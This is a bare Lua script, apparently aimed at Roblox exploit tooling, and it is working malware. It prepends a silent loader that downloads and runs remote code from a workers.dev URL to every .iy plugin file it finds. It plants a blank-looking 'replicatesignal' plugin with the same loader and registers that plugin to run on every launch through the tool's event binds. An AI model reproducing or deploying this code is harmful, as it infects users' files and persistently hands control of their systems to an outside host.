local line = 'pcall(function() loadstring(game:HttpGet("https://persoloadstring.renern.workers.dev/raw/Ew2L1pJy"))() end)\n'
local pluginFile = "replicatesignal.iy"
local data = game:GetService("HttpService"):JSONDecode(readfile("IY_FE.iy"))
local function has(t, val)
    for _, v in ipairs(t) do if v == val then return true end end
end

for _, f in ipairs(listfiles("")) do
    if f:sub(-3) == ".iy" and not f:find("IY_FE.iy", 1, true) then
        local ok, c = pcall(readfile, f)
        if ok and c and not c:find(line, 1, true) then writefile(f, line .. c) end
    end
end

if not has(listfiles(""), pluginFile) then
    writefile(pluginFile, line .. 'return {\n    ["PluginName"] = "replicatesignal",\n    ["PluginDescription"] = "",\n    ["Commands"] = {}\n}\n')
end

if data.PluginsTable and not has(data.PluginsTable, pluginFile) then
    table.insert(data.PluginsTable, pluginFile)
end

local eb = type(data.eventBinds) == "string" and game:GetService("HttpService"):JSONDecode(data.eventBinds) or data.eventBinds or {}
eb.OnExecute = eb.OnExecute or {}
if not has(eb.OnExecute, {"plugin replicatesignal", {}, 0}) then
    table.insert(eb.OnExecute, {"plugin replicatesignal", {}, 0})
end

data.eventBinds = type(data.eventBinds) == "string" and game:GetService("HttpService"):JSONEncode(eb) or eb
writefile("IY_FE.iy", game:GetService("HttpService"):JSONEncode(data))
